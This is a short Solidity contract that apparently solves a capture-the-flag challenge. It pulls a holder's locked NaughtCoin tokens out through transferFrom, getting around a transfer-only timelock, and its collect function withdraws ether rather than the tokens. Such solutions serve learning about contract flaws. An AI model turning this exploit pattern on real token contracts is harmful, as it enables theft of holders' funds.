// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
}
contract NaughtCoinAttacker {

    function transfer(address _targetAddress, address _from, uint256 _value) public  {
        INaughtCoin(_targetAddress).transferFrom(_from, address(this), _value);
    }

    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}